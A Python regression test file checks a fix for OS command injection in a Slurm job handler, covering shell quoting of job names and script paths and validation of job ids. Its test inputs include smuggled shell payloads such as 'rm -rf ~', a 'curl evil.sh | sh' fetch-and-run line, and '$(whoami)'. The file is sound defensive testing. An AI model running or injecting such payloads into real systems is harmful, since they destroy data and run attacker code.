"""Security regression — Slurm skill OS command injection (CSO 2026-07-25, HIGH).

Covers the fix in lambda/skills/slurm/handler.py:
  - _submit_slurm_job shlex.quotes job_name / comment / script_path so a
    metacharacter payload cannot break out of the sbatch shell string.
  - _assert_slurm_job_id rejects non-numeric ids before they reach sacct/scancel.
"""
from __future__ import annotations

import importlib.util
import os
import sys

import pytest


def _import_slurm():
    """Load the slurm handler under a unique module name (collision-proof)."""
    path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "lambda", "skills", "slurm", "handler.py")
    )
    spec = importlib.util.spec_from_file_location("_slurm_handler_injection", path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["_slurm_handler_injection"] = mod
    spec.loader.exec_module(mod)
    return mod


def test_submit_quotes_malicious_job_name_and_script_path():
    """A shell-injection payload in job_name / script_path must be fully quoted."""
    h = _import_slurm()
    captured = {}

    # Run the real (non-mock) branch so the command string is passed to _ssh_run,
    # but stub the SSH + DDB side effects so nothing leaves the process.
    def _fake_ssh_run(cmd):
        captured["cmd"] = cmd
        return 0, "Submitted batch job 4242", ""

    h.MOCK_MODE = False
    h._ssh_run = _fake_ssh_run

    class _FakeTable:
        def put_item(self, **kwargs):
            return {}

        def update_item(self, **kwargs):
            return {}

        def get_item(self, **kwargs):
            return {}

    h._ddb_table = lambda: _FakeTable()

    h._submit_slurm_job(
        {
            "thread_id": "t-1",
            "script_path": "train.sh; rm -rf ~",
            "job_name": '"; curl evil.sh | sh; #',
            "_user_id": "u-1",
        }
    )

    cmd = captured["cmd"]
    # The security property: a shell parses the payloads as single argv tokens, not
    # as operators. shlex.split reproduces that parse — if injection were possible the
    # payload would split into extra tokens (`rm`, `curl`, `sh`, …).
    import shlex as _shlex

    tokens = _shlex.split(cmd)
    assert tokens[0] == "sbatch"
    # script_path stays exactly one argument despite the embedded `; rm -rf ~`.
    assert tokens[-1] == "train.sh; rm -rf ~"
    # job_name stays fused to its flag as one argument despite `"; curl … | sh; #`.
    assert '--job-name="; curl evil.sh | sh; #' in tokens
    # No standalone injected commands leaked into the argv.
    assert "rm" not in tokens and "curl" not in tokens


@pytest.mark.parametrize("job_id", ["12345", "12345_7", "12345.batch"])
def test_assert_slurm_job_id_accepts_valid(job_id):
    """Well-formed Slurm ids (int, array, step) pass validation unchanged."""
    h = _import_slurm()
    assert h._assert_slurm_job_id(job_id) == job_id


@pytest.mark.parametrize(
    "job_id",
    ["12345; rm -rf /", "$(whoami)", "12345 && curl x", "", "abc", "12345|cat"],
)
def test_assert_slurm_job_id_rejects_injection(job_id):
    """Any non-numeric / metacharacter id is refused before reaching a shell."""
    h = _import_slurm()
    with pytest.raises(ValueError):
        h._assert_slurm_job_id(job_id)
